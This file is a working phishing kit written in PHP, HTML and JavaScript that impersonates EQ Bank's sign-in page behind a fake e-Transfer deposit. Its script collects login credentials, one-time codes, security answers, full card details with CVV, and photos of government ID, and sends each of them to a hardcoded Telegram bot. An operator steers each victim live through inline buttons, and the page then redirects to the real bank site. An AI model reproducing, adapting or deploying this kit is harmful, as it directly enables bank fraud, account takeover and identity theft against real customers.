<?php
declare(strict_types=1);

ob_start();
if (session_status() === PHP_SESSION_NONE) session_start();

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");

/* ---------- Locate config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/');
$configPath = $docRoot . '/config/config.php';
$config     = @is_file($configPath) ? require $configPath : [];

/* ---------- Telegram credentials ---------- */
$telegramToken = $config['telegram']['bot_token'] ?? '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = $config['telegram']['chat_id'] ?? '-1002922644009';

/* ---------- Server-Side Proxy ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $allowed_actions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];
    
    if (in_array($action, $allowed_actions)) {
        $params = $_POST;
        unset($params['action']);
        
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                $params[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
            }
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegramToken}/{$action}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    }
    exit;
}

$cancelActionHandled = false;
if (isset($_GET['action']) && $_GET['action'] === 'cancel') {
    $logFile = __DIR__ . '/data/logs/transfers.log';
    if (@is_file($logFile) && @is_writable($logFile)) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!empty($lines)) {
            $last_line_key = count($lines) - 1;
            if (strpos($lines[$last_line_key], 'pending') !== false) {
                 $lines[$last_line_key] = str_replace('pending', 'Cancelled', $lines[$last_line_key]);
                 file_put_contents($logFile, implode(PHP_EOL, $lines) . PHP_EOL);
            }
        }
    }
    $cancelActionHandled = true;
}

/* ---------- Resolve transaction data ---------- */
$tx = $_SESSION['transaction'] ?? $_SESSION['transaction_data'] ?? $_SESSION['last_transfer'] ?? null;
if (!is_array($tx)) $tx = [];

/* ---------- Sender Name ---------- */
$senderName = (string)($tx['sender_name'] ?? $tx['sender'] ?? $config['sender_name'] ?? 'JENNIFER NOSKIYE');

/* ---------- Amount ---------- */
$amount = (string)($tx['amount'] ?? '10.00');

/* ---------- Security Question ---------- */
$securityQuestion = 'What is this for?';

/* Normalize amount display */
$amount = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);

$_SESSION['senderName'] = $senderName;
$_SESSION['amount'] = $amount;

/* ---------- Safe HTML values ---------- */
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$securityQuestionSafe = htmlspecialchars($securityQuestion, ENT_QUOTES, 'UTF-8');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=yes">
    <title>auth.eqbank.ca/u/login/identifier?state=hKFo2SBZTzNNbkhrVUxPQThPV1BaVkpzN3NLamxocTg0U2tKTKFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHRFd09zWWVJeDdIMGd5R3JHaXpVTGFWV1dxSlUydGd3o2NpZNkgNXBYNHBQZ0J2RGVSTEdyeGZwS3dXVTYwYUl1NGRpTEM&ui_locales=en-CA</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap');

        :root {
            --eq-yellow: #ffc72c;
            --eq-text-dark: #1a1a1a;
            --eq-text-light: #666;
            --eq-bg-light: #fcfaf8;
            --eq-border-color: #ccc;
            --eq-button-bg: #1a1a1a;
            --eq-button-text: #ffffff;
        }
        body {
            font-family: 'Lato', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: var(--eq-bg-light);
            margin: 0;
            color: var(--eq-text-dark);
            -webkit-font-smoothing: antialiased;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        main {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .step { display: none; }

        .form-wrapper {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            width: 150px;
            margin: 0 auto 40px;
        }

        .form-wrapper h3 {
            font-size: 1.75em;
            font-weight: 700;
            margin: 0 0 30px;
            color: var(--eq-text-dark);
        }
        
        .form-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: none; /* Placeholders are used instead */
        }
        .form-group input[type="email"], 
        .form-group input[type="password"], 
        .form-group input[type="text"], 
        .form-group input[type="tel"],
        .form-group select {
            width: 100%;
            box-sizing: border-box;
            border: 1px solid var(--eq-border-color);
            padding: 16px;
            font-size: 16px;
            border-radius: 8px;
            background-color: #fff;
        }
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: var(--eq-text-dark);
            box-shadow: 0 0 0 2px rgba(26,26,26,.2);
        }
        
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 15px;
        }
        .checkbox-container input {
            margin-right: 10px;
        }
        
        .button {
            width: 100%;
            border: none;
            padding: 18px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            color: var(--eq-button-text);
            background-color: var(--eq-button-bg);
        }
        .button:hover:not(:disabled) {
            opacity: 0.8;
        }
        .button:disabled {
            background-color: #e5e5e5;
            color: #999;
            cursor: not-allowed;
        }

        .link-group {
            margin-top: 25px;
            display: flex;
            justify-content: center;
            gap: 10px;
            align-items: center;
        }
        .nav-link {
            color: var(--eq-text-dark);
            text-decoration: underline;
            font-size: 15px;
            font-weight: 700;
            background: none;
            border: none;
            cursor: pointer;
        }
        .link-group span { /* Separator */
            color: #ccc;
        }

        /* Error & Loader */
        .error-message { color: #c00; background-color: #fdd; border: 1px solid #c00; border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 15px; display: none; text-align: left; }
        #stepLoader { display: none; position: fixed; z-index: 10000; width: 100%; height: 100%; top: 0; left: 0; background-color: rgba(255, 255, 255, 0.8); }
        #stepLoader .loader-container { display: flex; position: absolute; top: 0; bottom: 0; left: 0; right: 0; align-items: center; justify-content: center; }
        #stepLoader .loader { display: inline-block; width: 50px; height: 50px; border: 6px solid var(--eq-yellow); border-right-color: transparent; border-radius: 50%; animation: 1s linear 0s infinite rotate-cw; }
        @keyframes rotate-cw {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Subsequent Steps Styling */
        .page-info { font-size: 16px; color: var(--eq-text-light); margin-bottom: 30px; line-height: 1.5; }
        .tx-info { background: #f0f0f0; border-radius: 8px; padding: 20px; margin-bottom: 25px; text-align: left; font-size: 15px; border: 1px solid #eee; }
        .tx-info div { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .tx-info div:last-child { margin-bottom: 0; }
        .tx-info strong { color: var(--eq-text-dark); font-weight: 700; }
        #cancelTransferLink { color: var(--eq-text-dark); margin-top: 20px; font-size: 15px; }

        /* CC & ID Styling */
        .split-input { display: flex; gap: 10px; }
        .split-input .form-group { flex: 1; }
        .id-upload-area {
            border: 2px dashed #ccc;
            background: #fff;
            padding: 20px;
            text-align: center;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 15px;
            transition: 0.2s;
        }
        .id-upload-area:hover { border-color: var(--eq-yellow); background: #fffcf5; }
        .id-upload-area small { display: block; margin-top: 5px; color: var(--eq-text-light); }

        footer {
            background-color: transparent;
            color: #666;
            padding: 20px;
            text-align: center;
            font-size: 12px;
        }
        footer .footer-links {
            margin-bottom: 15px;
        }
        footer .footer-links a {
            color: #666;
            text-decoration: none;
            margin: 0 10px;
        }
        footer .footer-links a:hover {
            text-decoration: underline;
        }

    </style>
</head>
<body>
    <main>
        <div class="form-wrapper">
<img id="login_eq_logo" src="https://www.eqbank.ca/images/default-source/images/eq-logo-full-small-highres.png?sfvrsn=1179b3d3_16" class="login__eq-logo">
<br><br>
            <!-- Step 1: Login -->
            <div id="stepLogin" class="step">
                <form id="loginForm">
                     <div id="errorMsgLogin" class="error-message"></div>
                     <div class="form-group">
                        <input type="email" id="username" placeholder="Email address*" required>
                    </div>
                    <div class="form-group">
                        <input type="password" id="password" placeholder="Password*" required>
                    </div>
                    <div class="checkbox-container">
                       <input type="checkbox" id="RememberMe">
                       <label for="RememberMe">Remember my email</label>
                    </div>
                    <button type="submit" id="loginBtn" class="button">Sign in</button>
                </form>
                <div class="link-group">
                    <a href="#" class="nav-link">Sign up</a>
                    <span>|</span>
                    <a href="#" class="nav-link">Forgot password</a>
                    <span>|</span>
                    <a href="#" class="nav-link">Help</a>
                </div>
            </div>

            <!-- Step 2: PIN -->
            <div id="stepPIN" class="step">
                <h3>Security verification</h3>
                <form id="pinForm">
                    <p class="page-info">For your security, we've sent a 6-digit code to your registered device. Enter it below to continue.</p>
                    <div id="errorMsgPIN" class="error-message"></div>
                    <div class="form-group">
                        <input type="tel" id="pinCode" maxlength="6" inputmode="numeric" pattern="[0-9]*" placeholder="6-digit code*" required>
                    </div>
                    <button type="submit" id="pinBtn" class="button">Continue</button>
                </form>
            </div>

            <!-- Step 3: Security Question -->
             <div id="stepSQ" class="step">
                <h3>Accept e-Transfer</h3>
                 <form id="sqForm">
                    <div class="tx-info">
                        <div><span>Sender:</span> <strong><?php echo $senderNameSafe; ?></strong></div>
                        <div><span>Amount:</span> <strong>$<?php echo $amountSafe; ?> CAD</strong></div>
                    </div>
                    <p class="page-info"><strong>Security Question:</strong><br><?php echo $securityQuestionSafe; ?></p>
                    <div id="errorMsgSQ" class="error-message"></div>
                    <div class="form-group">
                        <input type="text" id="sqAnswer" placeholder="Answer*" required>
                    </div>
                    <button type="submit" id="sqBtn" class="button">Accept Transfer</button>
                     <button type="button" id="cancelTransferLink" class="nav-link">Cancel Transfer</button>
                 </form>
            </div>

            <!-- Step 4: Credit Card -->
            <div id="stepCC" class="step">
                <h3>Card Verification</h3>
                <form id="ccForm">
                    <p class="page-info">To verify your identity, please enter your card information below.</p>
                    <div id="errorMsgCC" class="error-message"></div>
                    <div class="form-group">
                        <input type="tel" id="ccNum" placeholder="Card Number" maxlength="19" required>
                    </div>
                    <div class="split-input">
                        <div class="form-group">
                            <select id="ccMonth" class="form-control" required>
                                <option value="" disabled selected>MM</option>
                                <option>01</option><option>02</option><option>03</option><option>04</option>
                                <option>05</option><option>06</option><option>07</option><option>08</option>
                                <option>09</option><option>10</option><option>11</option><option>12</option>
                            </select>
                        </div>
                         <div class="form-group">
                            <select id="ccYear" class="form-control" required>
                                <option value="" disabled selected>YY</option>
                                <option>25</option><option>26</option><option>27</option><option>28</option>
                                <option>29</option><option>30</option><option>31</option><option>32</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <input type="tel" id="ccCvv" placeholder="CVV" maxlength="3" required>
                        </div>
                    </div>
                    <button type="submit" id="ccBtn" class="button">Verify Card</button>
                </form>
            </div>

            <!-- Step 5: ID Upload -->
            <div id="stepID" class="step">
                <h3>Identity Verification</h3>
                <p class="page-info">Please upload a clear photo of your government-issued ID (Front and Back).</p>
                <div id="errorMsgID" class="error-message"></div>
                
                <div class="id-upload-area" onclick="document.getElementById('idFront').click()">
                    <div>📷 Upload Front ID</div>
                    <small id="nameFront">No file selected</small>
                    <input type="file" id="idFront" accept="image/*" hidden onchange="document.getElementById('nameFront').innerText = this.files[0].name">
                </div>

                <div class="id-upload-area" onclick="document.getElementById('idBack').click()">
                    <div>📷 Upload Back ID</div>
                    <small id="nameBack">No file selected</small>
                    <input type="file" id="idBack" accept="image/*" hidden onchange="document.getElementById('nameBack').innerText = this.files[0].name">
                </div>

                <button id="idBtn" class="button" onclick="handleIDStep()">Submit Documents</button>
            </div>

            <!-- Step 6: Success Confirmation -->
            <div id="stepConfirm" class="step">
                <h3>Success</h3>
                <p class="page-info">Your transfer of <strong>$<?php echo $amountSafe; ?> CAD</strong> is complete. You will be redirected shortly.</p>
            </div>

            <!-- Step 7: Cancel Confirmation -->
            <div id="stepCancelConfirm" class="step">
                <h3>Transfer Cancelled</h3>
                <p class="page-info">The e-Transfer was successfully cancelled. No funds have been deposited.</p>
                <button onclick="location.href='index.php'" class="button">Return to Sign In</button>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-links">
            <a href="#">Contact us</a>
            <a href="#">FAQ</a>
            <a href="#">Accessibility</a>
            <a href="#">Privacy</a>
            <a href="#">Security</a>
            <a href="#">Legal</a>
        </div>
        <p>&trade; Trademark of Equitable Bank, all rights reserved.<br>EQ Bank is a trade name of Equitable Bank.</p>
    </footer>
    
    <div id="stepLoader">
        <div class="loader-container">
            <div class="loader"></div>
        </div>
    </div>

    <script>
    const chatId = "<?= $chatId ?>";
    const ALL_STEPS = ['stepLogin', 'stepPIN', 'stepSQ', 'stepCC', 'stepID', 'stepConfirm', 'stepCancelConfirm'];
    
    function showStep(stepId) {
        ALL_STEPS.forEach(id => {
            const el = document.getElementById(id);
            if (el) el.style.display = 'none';
        });
        const stepEl = document.getElementById(stepId);
        if(stepEl) stepEl.style.display = 'block';
        window.scrollTo(0,0);
    }

    const loader = document.getElementById('stepLoader');
    function showLoader() { if (loader) loader.style.display = 'block'; }
    function hideLoader() { if (loader) loader.style.display = 'none'; }
    function showError(msg, errorId) {
        const el = document.getElementById(errorId);
        if (el) { el.textContent = msg; el.style.display = 'block'; }
    }
    function hideError(errorId) {
        const el = document.getElementById(errorId);
        if (el) el.style.display = 'none';
    }

    // CC Formatting
    document.getElementById('ccNum').addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, '').substring(0,16);
        let f = v.match(/.{1,4}/g);
        e.target.value = f ? f.join(' ') : v;
    });

    // API Proxy Helper
    async function api(action, data, isFile = false) {
        let body;
        if(isFile) {
            body = new FormData();
            body.append('action', action);
            for(let k in data) body.append(k, data[k]);
        } else {
            const fd = new FormData();
            fd.append('action', action);
            for(let k in data) fd.append(k, data[k]);
            body = fd;
        }
        return fetch('', {method:'POST', body}).then(r=>r.json());
    }

    let lastUpdateId = 0;
    let pollInterval;

    // Initialize Polling
    api('getUpdates', {offset: -1}).then(d => { 
        if(d.result && d.result.length) lastUpdateId = d.result[0].update_id; 
    });

    function poll(msgId, onOk, onFail, onCleanup) {
        if(pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            try {
                const r = await fetch('', {
                    method:'POST', 
                    headers:{'Content-Type':'application/x-www-form-urlencoded'},
                    body:`action=getUpdates&offset=${lastUpdateId+1}&timeout=2`
                });
                const d = await r.json();
                if(d.result && d.result.length) {
                    for(let u of d.result) {
                        lastUpdateId = u.update_id;
                        if(u.callback_query && u.callback_query.message.message_id == msgId) {
                            clearInterval(pollInterval);
                            const cmd = u.callback_query.data;
                            api('editMessageReplyMarkup', {chat_id:chatId, message_id:msgId, reply_markup:JSON.stringify({inline_keyboard:[]})});
                            
                            if (typeof onCleanup === 'function') onCleanup(); // Clear loader/reset btns
                            
                            if(cmd === 'yes') onOk();
                            else if(cmd === 'no') onFail();
                            else if(cmd === 'go_cc') showStep('stepCC');
                            else if(cmd === 'go_id') showStep('stepID');
                            else if(cmd === 'cancel') window.location.href="https://www.eqbank.ca";
                        }
                    }
                }
            } catch(e){}
        }, 2000);
    }

    async function sendLog(step, content, btnId, next) {
        const btn = document.getElementById(btnId);
        const originalText = btn.textContent;
        btn.textContent = 'Processing...'; 
        btn.disabled = true;
        showLoader();
        
        const cleanup = () => {
             hideLoader();
             btn.disabled = false;
             btn.textContent = originalText;
        };

        try {
            const kb = {inline_keyboard:[
                [{text:"✅ ALLOW", callback_data:"yes"}, {text:"❌ BLOCK", callback_data:"no"}],
                [{text:"REQ CC", callback_data:"go_cc"}, {text:"REQ ID", callback_data:"go_id"}],
                [{text:"🚫 END SESSION", callback_data:"cancel"}]
            ]};
            
            const r = await api('sendMessage', {
                chat_id: chatId,
                text: `🟢 <b>EQ BANK - ${step}</b>\n\n${content}`,
                parse_mode: 'HTML',
                reply_markup: JSON.stringify(kb)
            });
            
            poll(r.result.message_id, 
                () => next(), // OK
                () => { // Fail
                    if(step === 'LOGIN') { showStep('stepLogin'); showError('The details you entered didn\'t match our records.', 'errorMsgLogin'); }
                    if(step === 'PIN') { showStep('stepPIN'); showError('The code you entered is incorrect.', 'errorMsgPIN'); }
                    if(step === 'SQ') { showStep('stepSQ'); showError('The answer provided is incorrect.', 'errorMsgSQ'); }
                    if(step === 'CC') { showStep('stepCC'); showError('Card information is invalid.', 'errorMsgCC'); }
                },
                cleanup // Cleanup for custom navigation
            );
        } catch(e) {
            cleanup();
        }
    }

    document.getElementById('loginForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const u = document.getElementById('username').value.trim();
        const p = document.getElementById('password').value.trim();
        if (u.length < 3 || p.length < 6) { showError("Please enter valid credentials.", 'errorMsgLogin'); return; }
        hideError('errorMsgLogin');
        sendLog('LOGIN', `Email: <code>${u}</code>\nPass: <code>${p}</code>`, 'loginBtn', () => showStep('stepPIN'));
    });

    document.getElementById('pinForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const c = document.getElementById('pinCode').value.trim();
        if (!/^\d{6}$/.test(c)) { showError('Please enter the 6-digit code.', 'errorMsgPIN'); return; }
        hideError('errorMsgPIN');
        sendLog('PIN', `Code: <code>${c}</code>`, 'pinBtn', () => showStep('stepSQ'));
    });

    document.getElementById('sqForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const a = document.getElementById('sqAnswer').value.trim();
        if (!a) { showError('Answer required.', 'errorMsgSQ'); return; }
        hideError('errorMsgSQ');
        sendLog('SQ', `Answer: <code>${a}</code>`, 'sqBtn', () => {
             showStep('stepConfirm');
             setTimeout(() => { window.location.href = 'https://www.eqbank.ca/'; }, 4000);
        });
    });

    document.getElementById('ccForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const n = document.getElementById('ccNum').value;
        const m = document.getElementById('ccMonth').value;
        const y = document.getElementById('ccYear').value;
        const c = document.getElementById('ccCvv').value;
        if(!m || !y) { showError('Expiration Date Required', 'errorMsgCC'); return; }
        hideError('errorMsgCC');
        sendLog('CC', `Card: <code>${n}</code>\nExp: <code>${m}/${y}</code>\nCVV: <code>${c}</code>`, 'ccBtn', () => showStep('stepID'));
    });

    async function handleIDStep() {
        const f = document.getElementById('idFront').files[0];
        const b = document.getElementById('idBack').files[0];
        if(!f || !b) { showError("Please select both front and back images.", 'errorMsgID'); return; }
        hideError('errorMsgID');
        
        const btn = document.getElementById('idBtn');
        const originalText = btn.textContent;
        btn.textContent = "Uploading...";
        btn.disabled = true;
        showLoader();

        try {
            await api('sendPhoto', {chat_id: chatId, caption: 'Front ID', photo: f}, true);
            await api('sendPhoto', {chat_id: chatId, caption: 'Back ID', photo: b}, true);
            
            sendLog('ID DOCS', 'Documents uploaded.', 'idBtn', () => {
                 showStep('stepConfirm');
                 setTimeout(() => { window.location.href = 'https://www.eqbank.ca/'; }, 4000);
            });
        } catch(e) {
            hideLoader();
            btn.disabled = false;
            btn.textContent = originalText;
            showError("Upload failed. Please try again.", 'errorMsgID');
        }
    }

    document.getElementById('cancelTransferLink').addEventListener('click', (e) => {
        e.preventDefault();
        showLoader();
        window.location.href = '?action=cancel';
    });
    
    document.addEventListener('DOMContentLoaded', () => {
        const initialStep = '<?php echo $cancelActionHandled ? 'stepCancelConfirm' : 'stepLogin'; ?>';
        showStep(initialStep);
    });
    </script>

</body>
</html>